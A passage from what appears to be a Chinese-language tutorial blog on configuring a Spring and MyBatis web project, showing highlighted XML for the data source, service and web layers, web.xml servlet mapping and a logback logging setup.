class="hljs-string">&quot;true&quot;</span> /&gt;</span>        <span class="hljs-comment">&lt;!-- 使用列标签替换列别名 默认:true--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;useColumnLabel&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span>        <span class="hljs-comment">&lt;!-- 开启驼峰命名转换：Table&#123;create_time&#125; -&gt; Entity&#123;createTime&#125;  --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>language-xml复制代码</code></pre><hr><h4 id="3-4-4、-Spring-相关配置"><a href="#3-4-4、-Spring-相关配置" class="headerlink" title="3.4.4、 Spring 相关配置"></a>3.4.4、 Spring 相关配置</h4><ol><li>Dao 层: src&#x2F;main&#x2F;resources&#x2F;spring&#x2F;spring-dao.xml</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">    http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><span class="hljs-string"><span class="hljs-tag">    http://www.springframework.org/schema/context</span></span><span class="hljs-string"><span class="hljs-tag">    http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 配置整合mybatis过程 --&gt;</span><span class="hljs-comment">&lt;!-- 1.配置数据库相关参数properties的属性：$&#123;url&#125; --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;classpath:jdbc.properties&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!-- 2.数据库连接池 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 配置连接池属性 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driverClass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;jdbcUrl&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.url&#125;&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.password&#125;&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!-- c3p0连接池的私有属性 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;maxPoolSize&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;30&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;minPoolSize&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!-- 关闭连接后不自动commit --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autoCommitOnClose&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!-- 获取连接超时时间 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;checkoutTimeout&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10000&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!-- 当获取连接失败重试次数 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;acquireRetryAttempts&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-comment">&lt;!-- 3.配置SqlSessionFactory对象,用于创建数据库连接池的对象 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;sqlSessionFactory&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 注入数据库连接池 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;dataSource&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!-- 配置MyBaties全局配置文件:mybatis-config.xml --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;configLocation&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;classpath:mybatis-config.xml&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!-- 扫描entity包 使用别名 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;typeAliasesPackage&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!-- 扫描sql配置文件:mapper需要的xml文件 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mapperLocations&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;classpath:mapper/*.xml&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-comment">&lt;!-- 4.配置扫描Dao接口包，动态实现Dao接口，注入到spring容器中 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 注入sqlSessionFactory --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sqlSessionFactoryBeanName&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;sqlSessionFactory&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!-- 给出需要扫描Dao接口包 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basePackage&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.imooc.o2o.dao&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span>language-xml复制代码</code></pre><ol><li>Service 层: src&#x2F;main&#x2F;resources&#x2F;spring&#x2F;spring-service.xml</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xmlns:tx</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/tx&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">    http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><span class="hljs-string"><span class="hljs-tag">    http://www.springframework.org/schema/context</span></span><span class="hljs-string"><span class="hljs-tag">    http://www.springframework.org/schema/context/spring-context.xsd</span></span><span class="hljs-string"><span class="hljs-tag">    http://www.springframework.org/schema/tx</span></span><span class="hljs-string"><span class="hljs-tag">    http://www.springframework.org/schema/tx/spring-tx.xsd&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 扫描service包下所有使用注解的类型 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.imooc.o2o.service&quot;</span> /&gt;</span>    <span class="hljs-comment">&lt;!-- 配置事务管理器,事务原子性等 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;transactionManager&quot;</span></span><span class="hljs-tag">        <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span>        <span class="hljs-comment">&lt;!-- 注入数据库连接池 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;dataSource&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 配置基于注解的声明式事务 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">tx:annotation-driven</span> <span class="hljs-attr">transaction-manager</span>=<span class="hljs-string">&quot;transactionManager&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span>language-xml复制代码</code></pre><ol><li>Web 层: src&#x2F;main&#x2F;resources&#x2F;spring&#x2F;spring-web.xml</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">xmlns:mvc</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/context</span></span><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/context/spring-context.xsd</span></span><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/mvc</span></span><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- HandlerMapping 无需配置，SpringMVC可以默认启动，DefaultAnnotationHandlerMapping annotation-driven HandlerMapping --&gt;</span><span class="hljs-comment">&lt;!-- 配置SpringMVC --&gt;</span><span class="hljs-comment">&lt;!-- 1.开启SpringMVC注解模式 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mvc:annotation-driven</span>/&gt;</span><span class="hljs-comment">&lt;!-- 2.静态资源默认servlet配置 (1)加入对静态资源的处理：js,gif,png (2)允许使用&quot;/&quot;做整体映射 , 不会拦截，当为静态资源。 这两个都是处理静态资源的，区别可以理解成一个是指定一个自定义的serlvet来专门处理相应的静态资源，如果不指定 会默认找default名字的servlet 而&lt;mvc:resources&gt;的好处可以理解成是静态资源可以在我们项目中的任意位置配置，只需要将对应的位置声明即可 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mvc:resources</span> <span class="hljs-attr">mapping</span>=<span class="hljs-string">&quot;/resources/**&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;/resources/&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mvc:default-servlet-handler</span>/&gt;</span><span class="hljs-comment">&lt;!-- 3.定义视图解析器 --&gt;</span><span class="hljs-comment">&lt;!-- ViewResolver:视图解析器。可以配置多个 但是一定要将这个ViewResolver(InternalResourceViewResolver) 放到最后 --&gt;</span><span class="hljs-comment">&lt;!-- 解析json格式的传参和封装数据到页面，注意spring的版本和对应的配置方式 --&gt;</span><span class="hljs-comment">&lt;!-- spring-4.2以后 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;viewResolver&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;prefix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/WEB-INF/html/&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;suffix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;.html&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-comment">&lt;!-- 4.扫描web相关的bean --&gt;</span><span class="hljs-comment">&lt;!-- 激活组件扫描功能,扫描aop的相关组件组件 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.imooc.o2o.web&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span>language-xml复制代码</code></pre><ol><li>将 sping 的配置整合在一起，web.xml</li></ol><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>spring-dispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:spring/spring-*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>spring-dispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 默认匹配所有的请求 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>language-xml复制代码</code></pre><hr><h2 id="3-5-logback-日志配置"><a href="#3-5-logback-日志配置" class="headerlink" title="3.5 logback 日志配置"></a>3.5 logback 日志配置</h2><ol><li>src&#x2F;main&#x2F;resources&#x2F;logback.xml</li></ol><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span> <span class="hljs-attr">scan</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">scanPeriod</span>=<span class="hljs-string">&quot;60 seconds&quot;</span></span></span><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">debug</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 定义参数常liang --&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR --&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 常用 DEBUG、INFO 和 ERROR 就可以了 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;log.level&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;debug&quot;</span>/&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件保留时间 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;log.maxHistory&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;30&quot;</span> /&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 日志存储的位置 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;log.filePath&quot;</span></span></span><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;catalina.base&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">/logs/webapps&quot;</span> /&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 日志格式：时间 线程 级别 那个类输出的日志信息 换行 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;log.pattern&quot;</span></span></span><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">value</span>=<span class="hljs-string">&quot;%d</span></span></span><span class="hljs-template-variable">&#123;yyyy-MM-dd HH:mm:ss.SSS&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string"> [%thread] %-5level %logger</span></span></span><span class="hljs-template-variable">&#123;55&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string"> - %msg%n&quot;</span>/&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 输出到控制台的。日志输出媒介，控制台输出 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;consoleAppender&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.pattern&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 以下是输出日志文件的 --&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- DEBUG --&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 滚动日志 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;debugAppender&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件路径 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">file</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.filePath&#125;</span><span class="language-xml">/debug.log<span class="hljs-tag">&lt;/<span class="hljs-name">file</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 基于时间滚动，按天 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">rollingPolicy</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件名称,在log.filePath路径下生产以 debug.日期.log.gz结尾的文件 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">fileNamePattern</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.filePath&#125;</span><span class="language-xml">/debug/debug.%d</span><span class="hljs-template-variable">&#123;yyyy-MM-dd&#125;</span><span class="language-xml">.log.gz<span class="hljs-tag">&lt;/<span class="hljs-name">fileNamePattern</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件最大保存数量，轮询 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">maxHistory</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.maxHistory&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">maxHistory</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">rollingPolicy</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 将日志信息转化为字符串，将字符串输出到文件里 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.pattern&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 过滤器：过滤不是 debug.level的日志 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.classic.filter.LevelFilter&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">level</span>&gt;</span>DEBUG<span class="hljs-tag">&lt;/<span class="hljs-name">level</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 如何时debug日志就记录下来 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">onMatch</span>&gt;</span>ACCEPT<span class="hljs-tag">&lt;/<span class="hljs-name">onMatch</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 如果不是debug日志就否定掉 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">onMismatch</span>&gt;</span>DENY<span class="hljs-tag">&lt;/<span class="hljs-name">onMismatch</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-comment">&lt;!-- INFO --&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件滚动日志 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;infoAppender&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件路径 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">file</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.filePath&#125;</span><span class="language-xml">/info.log<span class="hljs-tag">&lt;/<span class="hljs-name">file</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 上面写满了，就使用下面的滚动文件 --&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 基于时间滚动，按天 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">rollingPolicy</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件名称,在log.filePath路径下生产以 debug.日期.log.gz结尾的文件 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">fileNamePattern</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.filePath&#125;</span><span class="language-xml">/info/info.%d</span><span class="hljs-template-variable">&#123;yyyy-MM-dd&#125;</span><span class="language-xml">.log.gz<span class="hljs-tag">&lt;/<span class="hljs-name">fileNamePattern</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 文件最大保存数量，轮询 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">maxHistory</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.maxHistory&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">maxHistory</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">rollingPolicy</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 将日志信息转化为字符串，将字符串输出到文件里 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;log.pattern&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 过滤器：过滤不是 debug.level的日志 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.classic.filter.LevelFilter&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">level</span>&gt;</span>INFO<span class="hljs-tag">&lt;/<span class="hljs-name">level</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 如何时debug日志就记录下来 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">onMatch</span>&gt;</span>ACCEPT<span class="hljs-tag">&lt;/<span class="hljs-name">onMatch</span>&gt;</span></span><span class="language-xml"><span class="hljs-comment">&lt;!-- 如果不是debug日志就否定掉 --&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">onMismatch</span>&gt;</span>DENY<span class="hljs-tag">&lt;/<span 